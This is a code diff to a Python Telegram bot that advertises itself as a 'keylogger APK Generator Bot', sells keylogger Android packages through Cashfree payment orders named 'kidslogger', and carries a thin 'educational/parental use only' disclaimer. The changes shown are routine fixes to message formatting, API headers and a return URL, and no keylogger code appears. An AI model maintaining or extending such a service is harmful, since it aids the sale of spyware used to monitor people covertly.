@@ -58,11 +58,11 @@ def handle_message():
     if command == "/start":
         welcome = (
             "👋 Welcome to the keylogger APK Generator Bot!\n\n"
-            "Developed by cyber naveen. For updates, follow [@cyber.naveen.info](https://www.instagram.com/cyber.naveen.info)\n\n"
+            "Developed by <a href=\"https://www.instagram.com/cyber.naveen.info\">cyber.naveen.info</a>\n\n"
             "🛡 Disclaimer: This is for educational/parental use only.\n\n"
             "Use /pay to proceed or /request_apk after payment."
         )
-        send_message(chat_id, welcome, "Markdown")
+        send_message(chat_id, welcome, "HTML")
 
     elif command == "/pay":
         payment_link = create_cashfree_order(chat_id)
@@ -123,6 +123,7 @@ def create_cashfree_order(chat_id):
     headers = {
         "x-client-id": CASHFREE_APP_ID,
         "x-client-secret": CASHFREE_SECRET_KEY,
+        "x-api-version": "2022-09-01",  # ✅ Added required version
         "Content-Type": "application/json"
     }
     order_id = f"kidslogger_{chat_id}"
@@ -136,7 +137,7 @@ def create_cashfree_order(chat_id):
             "customer_phone": "9999999999"
         },
         "order_meta": {
-            "return_url": "https://tellogs.koyeb.app//paid-success"
+            "return_url": "https://tellogs.koyeb.app/paid-success"
         }
     }
     try:
